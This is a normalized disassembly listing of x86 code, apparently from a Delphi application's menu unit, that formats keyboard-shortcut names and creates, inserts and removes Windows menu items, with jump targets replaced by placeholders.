push ecx
mov [ esp ] dx
xor edx edx
movzx ecx ax
shr ecx 0x8
test cl cl
jne r-xdata
mov eax edx
pop edx
retn
mov edx eax
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x4
je r-xdata
add dx 0x2000
test [ esp ] 0x2
je r-xdata
add dx 0x4000
add dx 0x8000
sub_45b1a0
push ebx
push esi
add esp 0xfffffe00
mov ebx edx
mov esi eax
mov eax ebx
xor edx edx
call sub_4070a8
push 0x0
mov eax esi
movzx eax al
push eax
call MapVirtualKeyW
shl eax 0x10
test eax eax
je r-xdata
add esp 0x200
pop esi
pop ebx
retn
push 0x100
lea edx [ esp + 0x4 ]
push edx
push eax
call GetKeyNameTextW
mov eax ebx
mov edx esp
mov ecx 0x100
call sub_407290
sub_45b1f0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_45b3cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx edi
movzx eax bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_4070fc
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x4 ]
movzx edx bl
sub edx 0x41
add edx 0x41
call sub_407214
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x4 ]
add bl 0xd
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_4070fc
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4070fc
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x4 ]
movzx edx bl
sub edx 0x60
add edx 0x30
call sub_407214
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x4 ]
movzx edx bl
sub edx 0x30
add edx 0x30
call sub_407214
jmp r-xdata
jmp r-xdata
mov eax esi
xor edx edx
call sub_4070a8
mov eax esi
xor edx edx
call sub_4070a8
test di 0x2000
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4070fc
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
lea edx [ ebp - 0x8 ]
movzx eax bl
sub eax 0x6f
call sub_411914
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_407564
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_45b1a0
test di 0x4000
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4074a4
lea eax [ ebp - 0x4 ]
add bl 0x4
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_4070fc
jmp r-xdata
jmp r-xdata
test di 0x8000
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4074a4
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4074a4
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4074a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b3d6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_45b3f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_45b50a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ edi ]
test eax eax
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
mov edx [ edi ]
mov eax edi
call sub_406a50
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax esi
jg r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b511
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ edi ]
call sub_407134
mov [ ebp - 0x8 ] eax
push esi
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push esi
mov eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x400
call __imp_CompareStringW
sub eax 0x2
test eax eax
jne r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov bl 0x1
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edx edi
mov ecx eax
mov eax 0x1
xchg edx eax
call sub_4078a0
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_45b51c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_45b5f7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_45b3f0
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45b3f0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45b3f0
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45b3f0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b5fe
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45b1f0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_411254
test eax eax
jne r-xdata
sub_45b638
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x9 ] 0x0
test esi esi
je r-xdata
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_45efdc
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_45efec
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_45b69c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_45efdc
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45efdc
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45efec
movzx eax [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45efec
movzx eax [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
movzx eax [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45b638
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_45b638
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45efec
movzx eax [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45efec
movzx eax [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_45b7ec
push ebx
mov ebx eax
mov eax ebx
call sub_48c6e8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x34 ]
call sub_4625e4
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45b824
push ebx
mov ebx eax
mov eax ebx
call sub_48c6fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
movzx eax [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45b854
push ebx
mov ebx eax
mov eax ebx
call sub_48c710
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
movzx eax [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45b884
push ebx
mov ebx eax
mov eax ebx
call sub_48c738
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45b8b4
push ebx
mov ebx eax
mov eax ebx
call sub_48c760
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_407768
je r-xdata
mov al 0x1
pop ebx
retn
sub_45b8e8
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_48c724
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_45b924
push ebx
mov ebx eax
mov eax ebx
call sub_48c774
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45b958
push ebx
mov ebx eax
mov eax ebx
call sub_48c788
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
movzx eax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45b98c
push ebx
mov ebx eax
mov eax ebx
call sub_48c79c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_405830
movzx eax [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45b9c0
push ebx
mov ebx eax
mov eax ebx
call sub_43cfa8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45b9e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_45ba08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45ee40
sub_45ba28
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45eeb4
sub_45ba48
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45ef08
sub_45ba68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_45ba84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_4070a8
sub_45baa8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45f034
sub_45bac8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45f010
sub_45bae8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45f024
sub_45bb08
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_45bb34
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] 0xffffffff
mov [ edi + 0x8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_45bba0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43c14c
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_45b618
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
lea eax [ ebx + 0x58 ]
xor edx edx
call sub_4070a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45f958
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_45bc24
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_462234
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_45efdc
test eax eax
jg r-xdata
mov edx esi
call sub_45f380
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_45efec
call sub_4055f0
cmp [ esi + 0xac ] 0x0
je r-xdata
lea eax [ esi + 0x5c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ esi + 0x44 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
lea eax [ esi + 0x78 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
movzx eax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_45c0d8
mov eax [ esi + 0xac ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_4311fc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c198
test bl bl
jle r-xdata
call sub_4055f0
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_45bcf8
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45bfc0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bfc7
lea eax [ ebp - 0x44 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x4 ]
mov edx [ edi + 0x34 ]
call sub_4070fc
mov eax edi
call sub_45efdc
test eax eax
jle r-xdata
cmp [ edi + 0x60 ] 0x0
je r-xdata
mov eax edi
call sub_45c284
mov [ ebp - 0x2c ] eax
jmp r-xdata
call GetVersion
cmp al 0x4
jb r-xdata
mov ebx [ edi + 0x64 ]
test ebx ebx
je r-xdata
mov eax [ edi + 0x34 ]
mov edx r-xdata
call sub_407768
sete al
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
movzx eax [ edi + 0x48 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ edi + 0x38 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ edi + 0x39 ]
or eax [ edx * 4 + rw-data ]
or ebx eax
or ebx 0x400
mov eax edi
call sub_45efdc
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x44 ]
movzx eax [ edi + 0x60 ]
call sub_45b1f0
push [ ebp - 0x44 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_407648
cmp [ ebx + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
movzx eax [ edi + 0x50 ]
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuW
mov eax [ edi + 0x34 ]
call sub_407134
push eax
mov eax edi
call sub_45c284
push eax
or ebx 0x10
push ebx
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuW
jmp r-xdata
mov [ ebp - 0x40 ] 0x30
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jle r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
jne r-xdata
mov [ ebp - 0x3c ] 0x3f
mov eax edi
call sub_45f5a8
mov esi eax
mov eax edi
call sub_45e754
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
mov [ ebp - 0x40 ] 0x2c
mov ebx [ edi + 0x4c ]
test ebx ebx
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
mov al 0x1
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ebx eax
mov eax [ edi + 0x64 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ edi + 0x34 ]
mov edx r-xdata
call sub_407768
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
movzx edx [ edi + 0x3d ]
mov edx [ edx * 4 + rw-data ]
movzx ecx [ edi + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
movzx edx [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
movzx edx bl
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x38 ] eax
movzx eax [ edi + 0x38 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ edi + 0x39 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ edi + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x34 ] eax
movzx eax [ edi + 0x50 ]
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax edi
call sub_45efdc
test eax eax
jle r-xdata
xor edx edx
mov eax 0x6
call sub_417224
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_407134
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x40 ]
push eax
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuItemW
jmp r-xdata
mov eax edi
call sub_45c284
mov [ ebp - 0x2c ] eax
call sub_485c78
cmp [ eax + 0x5 ] 0x0
je r-xdata
test bl bl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
cmp [ edi + 0x4c ] 0x0
jne r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jne r-xdata
mov al 0x1
cmp [ esi + 0x40 ] 0x0
jne r-xdata
sub_45bfe7
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx ecx [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0xac ]
call sub_45bcf8
xor eax eax
pop ebp
retn
sub_45c010
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4612dc
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45fc78
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_460498
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_45b69c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_45c080
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45c0ca
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_437924
mov eax [ ebp - 0x4 ]
call sub_45b51c
mov edx eax
mov eax ebx
call sub_45f010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c0d1
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_45c0d8
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_45c150
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_43c22c
sub_45c114
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43c684
mov eax ebx
call sub_45efc4
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45efc4
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xfff0
call sub_40587c
pop esi
pop ebx
retn
mov eax ebx
call sub_45c150
sub_45c150
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_45c284
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_45c150
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_45c284
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_45c284
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_45c010
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax ebp
call sub_45c284
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0xac ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0xac ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_45c224
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_45efdc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_45efec
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_45efec
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_45efec
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_45b148
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_45c284
push ebx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax [ ebx + 0xac ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0xac ] eax
call CreatePopupMenu
mov [ ebx + 0xac ] eax
jmp r-xdata
mov eax ebx
call sub_45c010
mov eax [ rw-data ]
call sub_45b148
cmp [ ebx + 0xac ] 0x0
jne r-xdata
sub_45c2dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c58c
push ebx
push sub_45c080
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_45c330
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45c5a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45f5a8
mov edi eax
